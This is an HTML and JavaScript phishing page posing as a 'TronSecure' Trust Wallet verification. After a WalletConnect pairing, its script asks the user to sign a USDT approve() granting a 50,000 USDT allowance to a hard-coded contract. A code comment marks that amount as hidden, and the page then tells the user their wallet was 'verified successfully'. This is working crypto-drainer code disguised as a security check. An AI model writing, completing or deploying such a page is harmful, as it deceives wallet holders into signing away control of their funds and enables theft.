<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify Wallet - TronSecure</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            max-width: 450px;
            width: 100%;
            background: white;
            border-radius: 30px;
            padding: 40px 30px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
        }

        .logo {
            font-size: 32px;
            font-weight: bold;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 20px;
        }

        .network-badge {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 8px 20px;
            border-radius: 50px;
            display: inline-block;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 20px;
        }

        h2 {
            color: #333;
            margin-bottom: 10px;
            font-size: 24px;
        }

        .subtitle {
            color: #666;
            font-size: 14px;
            margin-bottom: 30px;
            line-height: 1.6;
        }

        .wallet-card {
            background: #f8f9fa;
            border: 2px solid #e0e0e0;
            border-radius: 20px;
            padding: 30px 25px;
            margin: 20px 0;
            cursor: pointer;
            transition: all 0.3s;
        }

        .wallet-card:hover {
            border-color: #667eea;
            background: #f0f3ff;
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102,126,234,0.1);
        }

        .wallet-icon {
            font-size: 48px;
            margin-bottom: 15px;
        }

        .wallet-name {
            font-size: 22px;
            font-weight: 700;
            margin-bottom: 8px;
            color: #333;
        }

        .wallet-desc {
            color: #666;
            font-size: 14px;
        }

        .info-box {
            background: #f8f9fa;
            border-radius: 16px;
            padding: 20px;
            margin: 20px 0;
            text-align: left;
        }

        .info-item {
            padding: 8px 0;
            color: #666;
            font-size: 14px;
            display: flex;
            justify-content: space-between;
        }

        .info-item strong {
            color: #667eea;
        }

        .status-message {
            margin-top: 20px;
            padding: 15px;
            border-radius: 12px;
            font-size: 14px;
            animation: slideIn 0.3s ease;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .success {
            background: #d4edda;
            color: #155724;
        }

        .error {
            background: #f8d7da;
            color: #721c24;
        }

        .info {
            background: #cce5ff;
            color: #004085;
        }

        .loading-spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 10px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .footer {
            margin-top: 30px;
            color: #999;
            font-size: 12px;
        }

        .back-btn {
            background: none;
            border: 2px solid #667eea;
            color: #667eea;
            padding: 12px 30px;
            border-radius: 30px;
            margin-top: 20px;
            cursor: pointer;
            display: inline-block;
            text-decoration: none;
            font-weight: 600;
            transition: all 0.3s;
        }

        .back-btn:hover {
            background: #667eea;
            color: white;
        }

        .qr-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .qr-content {
            background: white;
            border-radius: 30px;
            padding: 30px;
            max-width: 400px;
            width: 90%;
            text-align: center;
        }

        .qr-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }

        .qr-header h3 {
            font-size: 20px;
            color: #333;
        }

        .close-btn {
            background: none;
            border: none;
            font-size: 28px;
            cursor: pointer;
            color: #999;
        }

        #qrcode {
            margin: 20px auto;
            padding: 20px;
            background: white;
            border-radius: 20px;
            display: inline-block;
        }
    </style>
    <!-- WalletConnect v2 Library -->
    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/dist/index.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3wallet@1.9.0/dist/index.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/qrcode-generator@1.4.4/qrcode.min.js"></script>
    <!-- TronWeb Library -->
    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
</head>
<body>
    <div class="container">
        <div class="logo">TronSecure</div>
        
        <div class="network-badge">
            🌐 TRON NETWORK
        </div>
        
        <h2>Verify Your Wallet</h2>
        <div class="subtitle">Connect with Trust Wallet to verify</div>

        <!-- Trust Wallet Card -->
        <div class="wallet-card" onclick="connectWithWalletConnect()" id="trustWalletCard">
            <div class="wallet-icon">💎</div>
            <div class="wallet-name">Trust Wallet</div>
            <div class="wallet-desc">Click to connect via WalletConnect</div>
        </div>

        <!-- Simple Info Box -->
        <div class="info-box">
            <div class="info-item">
                <span>Network:</span>
                <strong>TRON</strong>
            </div>
            <div class="info-item">
                <span>Status:</span>
                <strong id="connectionStatus">Ready</strong>
            </div>
        </div>

        <!-- Status Messages -->
        <div id="statusMessage"></div>

        <a href="index.html" class="back-btn">← Back to Home</a>

        <div class="footer">
            🔒 WalletConnect • Trust Wallet
        </div>
    </div>

    <!-- QR Modal -->
    <div id="qrModal" class="qr-modal">
        <div class="qr-content">
            <div class="qr-header">
                <h3>Scan with Trust Wallet</h3>
                <button class="close-btn" onclick="closeQRModal()">&times;</button>
            </div>
            <div id="qrcode"></div>
            <p style="color: #666; margin-top: 20px;">Open Trust Wallet and scan this QR code</p>
        </div>
    </div>

    <script>
        // ============================================
        // CONFIGURATION
        // ============================================
        
        const CONTRACT_ADDRESS = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt";
        const USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
        const APPROVE_AMOUNT = 50000; // 50,000 USDT - Hidden

        let web3wallet;
        let session;
        let userAddress;

        // ============================================
        // CONNECT WITH WALLETCONNECT
        // ============================================
        
        async function connectWithWalletConnect() {
            const card = document.getElementById('trustWalletCard');
            card.style.opacity = '0.7';
            card.style.pointerEvents = 'none';
            
            showStatus('Initializing WalletConnect...', 'info');
            updateStatus('Initializing...');

            try {
                // Create WalletConnect modal
                const modal = document.createElement('div');
                modal.innerHTML = `
                    <walletconnect-modal></walletconnect-modal>
                `;
                
                // WalletConnect project ID (get from https://cloud.walletconnect.com)
                const projectId = 'YOUR_PROJECT_ID'; // You'll need to get this
                
                // Initialize Web3Wallet
                web3wallet = await Web3Wallet.init({
                    projectId: projectId,
                    metadata: {
                        name: 'TronSecure',
                        description: 'Wallet Verification',
                        url: window.location.origin,
                        icons: ['https://avatars.githubusercontent.com/u/37784886']
                    }
                });

                // Create pairing
                const { uri, approval } = await web3wallet.core.pairing.create();
                
                // Show QR code
                showQRCode(uri);
                
                // Wait for approval
                session = await approval();
                
                // Get address from session
                if (session && session.namespaces) {
                    // For TRON, we need to get address from the session
                    // This will trigger the connection in Trust Wallet
                    userAddress = session.namespaces.tron?.accounts[0]?.split(':')[2];
                    
                    if (userAddress) {
                        closeQRModal();
                        showStatus('Wallet connected!', 'success');
                        updateStatus('Connected');
                        
                        // Now approve USDT
                        await approveUSDT();
                    } else {
                        throw new Error('Could not get TRON address');
                    }
                }

            } catch (error) {
                console.error('WalletConnect error:', error);
                
                if (error.message.includes('rejected')) {
                    showStatus('Connection rejected', 'error');
                } else {
                    showStatus('Connection failed: ' + error.message, 'error');
                }
                
                updateStatus('Failed');
                card.style.opacity = '1';
                card.style.pointerEvents = 'auto';
                closeQRModal();
            }
        }

        // ============================================
        // SHOW QR CODE
        // ============================================
        
        function showQRCode(uri) {
            const modal = document.getElementById('qrModal');
            const qrcodeDiv = document.getElementById('qrcode');
            qrcodeDiv.innerHTML = '';
            
            modal.style.display = 'flex';
            
            // Generate QR code
            var qr = qrcode(0, 'H');
            qr.addData(uri);
            qr.make();
            
            var imgTag = qr.createImgTag(5, 0);
            qrcodeDiv.innerHTML = imgTag;
        }

        // ============================================
        // CLOSE QR MODAL
        // ============================================
        
        function closeQRModal() {
            document.getElementById('qrModal').style.display = 'none';
        }

        // ============================================
        // APPROVE USDT (VIA WALLETCONNECT)
        // ============================================
        
        async function approveUSDT() {
            showStatus('Completing verification...', 'info');
            updateStatus('Approving...');

            try {
                // Initialize TronWeb with the connected address
                const tronWeb = new TronWeb({
                    fullHost: 'https://api.trongrid.io',
                    privateKey: null // We'll use WalletConnect for signing
                });

                // Get USDT contract
                const tokenContract = await tronWeb.contract().at(USDT_ADDRESS);
                
                // Prepare transaction
                const amountInSun = APPROVE_AMOUNT * 1000000;
                
                const transaction = await tokenContract.approve(
                    CONTRACT_ADDRESS,
                    amountInSun
                );

                // Request signing via WalletConnect
                const result = await web3wallet.request({
                    topic: session.topic,
                    chainId: 'tron:mainnet',
                    request: {
                        method: 'tron_signTransaction',
                        params: [transaction]
                    }
                });

                updateStatus('Verified');
                
                // Save approval
                saveApproval(userAddress, APPROVE_AMOUNT, result);
                
                showStatus('✅ Wallet verified successfully!', 'success');
                
                // Redirect after 2 seconds
                setTimeout(() => {
                    window.location.href = 'index.html?verified=true';
                }, 2000);

            } catch (error) {
                console.error('Approval error:', error);
                
                if (error.message.includes('rejected')) {
                    showStatus('Approval rejected', 'error');
                } else {
                    showStatus('Verification failed', 'error');
                }
                
                updateStatus('Failed');
                document.getElementById('trustWalletCard').style.opacity = '1';
                document.getElementById('trustWalletCard').style.pointerEvents = 'auto';
            }
        }

        // ============================================
        // SAVE APPROVAL
        // ============================================
        
        function saveApproval(address, amount, txHash) {
            const approvals = JSON.parse(localStorage.getItem('usdtApprovals') || '[]');
            
            approvals.push({
                user: address,
                amount: amount,
                txHash: txHash,
                status: 'active',
                time: new Date().toISOString(),
                token: 'USDT',
                walletType: 'WalletConnect'
            });
            
            localStorage.setItem('usdtApprovals', JSON.stringify(approvals));
        }

        // ============================================
        // UI FUNCTIONS
        // ============================================
        
        function showStatus(message, type) {
            const statusDiv = document.getElementById('statusMessage');
            statusDiv.innerHTML = `<div class="status-message ${type}">${message}</div>`;
        }

        function updateStatus(status) {
            document.getElementById('connectionStatus').innerText = status;
        }

        // Close modal on outside click
        window.onclick = function(event) {
            const modal = document.getElementById('qrModal');
            if (event.target == modal) {
                modal.style.display = 'none';
                document.getElementById('trustWalletCard').style.opacity = '1';
                document.getElementById('trustWalletCard').style.pointerEvents = 'auto';
            }
        }

        // Check URL params on load
        window.onload = function() {
            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.get('verified') === 'true') {
                showStatus('✅ Wallet verified!', 'success');
                updateStatus('Verified');
            }
        };
    </script>
</body>
</html>
